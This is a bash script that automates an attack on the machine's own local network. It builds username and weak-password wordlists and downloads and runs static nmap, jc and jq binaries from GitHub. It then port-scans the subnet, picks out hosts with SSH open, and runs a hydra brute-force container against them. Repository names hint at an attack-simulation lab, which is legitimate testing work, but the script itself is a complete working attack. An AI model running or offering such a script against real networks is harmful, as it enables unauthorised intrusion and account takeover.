#!/bin/bash

# Function to convert IP address to decimal
ip_to_dec() {
    local IFS=.
    read ip1 ip2 ip3 ip4 <<< "$1"
    echo "$((ip1 * 16777216 + ip2 * 65536 + ip3 * 256 + ip4))"
}

# Function to convert decimal to IP address
dec_to_ip() {
    local ip dec=$1
    for e in {3..0}; do
        ((octet = dec / (256 ** e) ))
        ((dec -= octet * 256 ** e))
        ip+="${octet}."
    done
    echo "${ip%?}"
}

# Main function to generate IP list from CIDR
generate_ips() {
    local cidr="$1"
    local ip="${cidr%/*}"
    local prefix="${cidr#*/}"
    local netmask=$((0xffffffff ^ ((1 << (32 - prefix)) - 1)))

    local start=$(ip_to_dec "$ip")
    local start=$((start & netmask))
    local end=$((start | ((1 << (32 - prefix)) - 1)))

    for ((ip= start; ip <= end; ip++)); do
        dec_to_ip "$ip"
    done
}

while ! command -v docker >/dev/null; do 
    echo "waiting for docker..."
    sleep 30;
done

cat > /tmp/hydra-users.txt <<'EOF'
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
EOF
cat > /tmp/hydra-passwords.txt <<'EOF'
123456
123456789
111111
password
qwerty
abc123
12345678
password1
1234567
123123
EOF
LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
generate_ips "$LOCAL_NET" > /tmp/hydra-targets.txt
echo $LOCAL_NET > /tmp/nmap-targets.txt
curl -LJ https://github.com/kellyjonbrazil/jc/releases/download/v1.25.0/jc-1.25.0-linux-x86_64.tar.gz -o jc.tgz
tar -zxvf jc.tgz && chmod 755 jc
curl -LJ -o jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 jq
curl -LJ https://github.com/credibleforce/static-binaries/raw/master/binaries/linux/x86_64/nmap -o /tmp/nmap && chmod 755 /tmp/nmap
/tmp/nmap -sT -p80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,990,5357,427,49156,543,544,5101,144,7,389 -oX /tmp/scan.xml -iL /tmp/nmap-targets.txt && cat /tmp/scan.xml | ./jc --xml -p | tee /tmp/scan.json
# find all ssh open ports
cat scan.json | ./jq -r '.nmaprun.host[] | select(.ports.port."@portid"=="22" and .ports.port.state."@state"=="open") | .address."@addr"' > /tmp/hydra-targets.txt
/bin/sh -c "docker run --rm -v /tmp:/tmp --entrypoint=hydra --name hydra ghcr.io/credibleforce/proxychains-hydra:main -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh" 2>&1 | tee /tmp/hydra.txt